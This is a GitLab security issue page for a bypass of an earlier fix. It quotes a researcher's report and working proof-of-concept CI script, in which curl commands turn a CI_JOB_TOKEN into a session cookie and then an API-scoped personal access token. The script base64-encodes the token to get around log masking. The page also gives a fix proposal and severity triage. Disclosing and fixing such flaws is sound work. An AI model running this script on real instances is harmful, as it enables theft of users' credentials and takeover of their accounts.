=== Content from gitlab.com_11113ab3_20250114_203147.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Bypass of #471954

## Problem

As described in [https://gitlab.com/gitlab-org/gitlab/-/issues/490916+](https://gitlab.com/gitlab-org/gitlab/-/issues/490916) a `CI_JOB_TOKEN` can be exchanged to get a `_gitlab_session` and then a PAT belonging to the user that `CI_JOB_TOKEN` is tied to. This is a bypass to an earlier fix - [https://gitlab.com/gitlab-org/gitlab/-/issues/471954+](https://gitlab.com/gitlab-org/gitlab/-/issues/471954).

Comments from the researcher on the bypass, taken from the [original report](https://gitlab.com/gitlab-org/gitlab/-/issues/490916):

> In the other hand, Gitlab recently [strip out](https://gitlab.com/gitlab-org/gitlab/-/commit/cafae257663e5e0e2c410fd642c18c2b549b3451 "Strip out Set-Cookie header from dependencyproxy auth response") `set-cookie` header from dependency\_proxy auth response. As this patch ignores the case `//v2` which still allows to escalate from CI\_JOB\_TOKEN to HTTP session.

> ```
> test:
>   image: ubuntu:20.04
>   variables:
>     GIT_STRATEGY: none
>   script:
>     - echo hello from $GITLAB_USER_LOGIN
>     - apt update && apt install -y curl jq coreutils
>     # obtain JWT token
>     - 'export TOKEN=$(curl -u gitlab-ci-token:$CI_JOB_TOKEN "$CI_SERVER_URL/jwt/auth?service=dependency_proxy" | jq --raw-output .token )'
>     # obtain _gitlab_session and store it in /tmp/cookie.txt
>     - 'curl -c /tmp/cookie.txt -H "Authorization: Bearer $TOKEN" $CI_SERVER_URL//v2'
>     # obtain CSRF token to perform a POST request
>     - 'export CSRF=$(curl -b /tmp/cookie.txt  $CI_SERVER_URL/-/user_settings/personal_access_tokens | grep csrf-token | cut -d \" -f 4)'
>     # create a personal token with api scop
>     - 'curl -b /tmp/cookie.txt -kv -H "X-Csrf-Token: $CSRF" -d "personal_access_token[name]=x&personal_access_token[expires_at]=2024-12-31&personal_access_token[scopes][]=api" $CI_SERVER_URL/-/user_settings/personal_access_tokens | tee /tmp/token.json'
>     # as token is masked in job trace, but can obtain via other format, such as, base64
>     - base64 /tmp/token.json
>   rules:
>     - if: $GITLAB_USER_LOGIN != "attacker" # please replace your attacker username here
> ```

> **Fix proposal:**
>
> I see that, [Gitlab already used](https://gitlab.com/gitlab-org/gitlab/-/blob/c48551076d84cef5d5f2b61ca83e1443aa02d2ae/app/controllers/repositories/git_http_client_controller.rb#L15) `skip_around_action :set_session_storage` to exclude `set-session` header in any HTTP requests related to git. I think that, the same principle can be applied to the dependency proxy requests.

I think this is [Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:L) severity issue hence the [severity3](/gitlab-org/gitlab/-/issues?label_name=severity%3A%3A3 "<span class='font-weight-bold'>Scoped label</span><br>Major - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity") [priority3](/gitlab-org/gitlab/-/issues?label_name=priority%3A%3A3 "<span class='font-weight-bold'>Scoped label</span><br>We want to address this but may have other higher priority items. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority") labels.

/cc [@dmeshcharakou](/dmeshcharakou "Dzmitry (Dima) Meshcharakou") [@trizzi](/trizzi "Tim Rizzi") [@crystalpoole](/crystalpoole "Crystal Poole") [@10io](/10io "David Fernandez") [@greg](/greg "Greg Myers") [@ameyadarshan](/ameyadarshan "Ameya Darshan")

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


